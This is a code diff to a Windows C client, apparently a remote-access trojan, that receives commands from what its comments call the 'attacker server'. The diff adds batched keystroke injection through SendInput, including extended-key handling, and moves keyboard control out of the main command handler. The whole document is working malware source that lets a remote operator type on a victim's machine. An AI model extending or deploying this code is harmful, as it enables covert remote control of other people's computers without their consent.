@@ -49,6 +49,8 @@
 #define MOUSE_WHEEL 23 /* this will be followed by a number to specify the scroll amount */
 #define KEY_DOWN 24 /* this will be followed by a Windows virtual-key code */
 #define KEY_UP 25 /* same as KEY_DOWN */
+#define START_INPUT 26 /* tell the C client to simulate inputs from a list of all input events since last frame */
+#define CONT_INPUT 27 /* tell the C client there's more input - ends with null terminator */
 
 // define useful globals
 char currDir[MAX_PATH]; // name of the current directory
@@ -175,6 +177,97 @@ void listDirectoryContents() {
 }
 
 /*
+* Helper function to check if KEYEVENTF_EXTENDEDKEY needs to be set for a given virtual-key code 
+* The following is pulled from the MSDN documentation:
+* 
+* The extended-key flag indicates whether the keystroke message originated from one of the 
+* additional keys on the enhanced keyboard. The extended keys consist of the ALT and
+* CTRL keys on the right-hand side of the keyboard; the INS, DEL, HOME, END, PAGE UP, PAGE DOWN,
+* and arrow keys in the clusters to the left of the numeric keypad; the NUM LOCK key; 
+* the BREAK (CTRL+PAUSE) key; the PRINT SCRN key; and the divide (/) and 
+* ENTER keys in the numeric keypad. The extended-key flag is set if the key is an extended key.
+*/
+DWORD isExtendedKey (WORD code) {
+	switch(code)
+	{
+		// from stackoverflow: VK_UP, VK_DOWN, VK_LEFT, VK_RIGHT, VK_HOME, VK_END, VK_PRIOR, VK_NEXT, VK_INSERT, VK_DELETE
+		case VK_RMENU:
+		case VK_RCONTROL:
+		case VK_INSERT:
+		case VK_DELETE:
+		case VK_HOME:
+		case VK_END:
+		case VK_PRIOR:
+		case VK_NEXT:
+		case VK_LEFT:
+		case VK_RIGHT:
+		case VK_UP:
+		case VK_DOWN:
+			return KEYEVENTF_EXTENDEDKEY;
+		default:
+			return 0;
+	}
+}
+
+/*
+* Process input stream sent from command server
+* Send inputs to OS if keyboard and/or mouse control is enabled
+*/
+void processInputStream(char* buffer) {
+	// locals used for processing stuff
+	int idx = 0;
+	char cmd;
+	// main loop - this always passes the first time
+	do {
+		cmd = buffer[idx + 1];
+		if (mouseControl == 1) {
+			if (cmd == MOUSE_DOWN) {
+
+			} else if (cmd == MOUSE_UP) {
+
+			} else if (cmd == MOUSE_WHEEL) {
+
+			} else if (cmd == MOUSE_POS) {
+
+			}
+		} else if (keyboardControl == 1) {
+			// assume we will be sending a key input and create the INPUT structure
+			// this shouldn't be that big of a time waste if we don't send an input
+			INPUT in; // INPUT structure to send
+			in.type = INPUT_KEYBOARD; // this is a keyboard input
+			in.ki.wScan = 0; // not using the scan code
+			in.ki.time = 0; // let the system generate a timestamp
+			in.ki.dwExtraInfo = 0; // no extra info to send
+			in.ki.wVk = buffer[idx+2]; // set the virtual key-code to what we received
+			DWORD extendedFlag = isExtendedKey(in.ki.wVk);
+			// check if we're sending an input, and whether that input is a key press or key release
+			if (cmd == KEY_DOWN) {
+				printf("Pressing %x\n", (unsigned char)buffer[idx+2]);
+				in.ki.dwFlags = extendedFlag; // no flags (0) for key press
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting key press into input stream: %d\n", GetLastError()); }
+				idx += 3;
+			} else if (cmd == KEY_UP) {
+				printf("Releasing %x\n", (unsigned char)buffer[idx + 2]);
+				in.ki.dwFlags = KEYEVENTF_KEYUP | extendedFlag; // KEYEVENTF_KEYUP for key release
+				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
+					printf("Error inserting key press into input stream: %d\n", GetLastError()); }
+				idx += 3;
+			}
+		}
+	} while(buffer[idx] == CONT_INPUT);
+	// DEBUG
+	printf("Processed buffer + 5:");
+	for (int i=0; i<idx + 5; i++) {
+		if (i == idx) {
+			printf(" |");
+		}
+		printf(" %x", (unsigned char)buffer[i]);
+	}
+	printf("\n");
+}
+
+/*
 * Handle commands from the attacker server
 * Return the #DEFINE associated with the command
 */
@@ -261,33 +354,8 @@ char handleCommand(char* buffer) {
 		keyboardControl = 0;
 	} else if (cmd == KILL_PROC) {
 		printf("Ending process...\n");
-	} else if (mouseControl == 1) { // check for mouse inputs if the mouse is being controlled
-		if (cmd == MOUSE_DOWN) {
-
-		} else if (cmd == MOUSE_UP) {
-
-		} else if (cmd == MOUSE_WHEEL) {
-
-		}
-	} else if (keyboardControl == 1) { // check for key inputs if the keyboard is being controlled
-		// assume we will be sending a key input and create the INPUT structure
-		// this shouldn't be that big of a time waste if we don't send an input
-		INPUT in; // INPUT structure to send
-		in.type = INPUT_KEYBOARD; // this is a keyboard input
-		in.ki.wScan = 0; // not using the scan code
-		in.ki.time = 0; // let the system generate a timestamp
-		in.ki.dwExtraInfo = 0; // no extra info to send
-		in.ki.wVk = buffer[1]; // set the virtual key-code to what we received
-		// check if we're sending an input, and whether that input is a key press or key release
-		if (cmd == KEY_DOWN) {
-			in.ki.dwFlags = 0; // no flags (0) for key press
-			if (SendInput(1, &in, sizeof(INPUT)) == 0) {
-				printf("Error inserting key press into input stream: %d\n", GetLastError()); }
-		} else if (cmd == KEY_UP) {
-			in.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
-			if (SendInput(1, &in, sizeof(INPUT)) == 0) {
-				printf("Error inserting key press into input stream: %d\n", GetLastError()); }
-		}
+	} else if (cmd == START_INPUT) {
+		processInputStream(buffer);
 	} else {
 		printf("Unknown command received: %d\n", cmd);
 	}
@@ -328,6 +396,7 @@ void connectToCommandServer() {
 	// get and process commands from the attacker
 	do {
 		// get the next command and check for errors or a closed connection
+		ZeroMemory(buffer, 4096);
 		retCode = recv(mainSock, buffer, 4096, 0);
 		if (retCode == 0) {
 			printf("Connection closed...\nExiting program...\n");
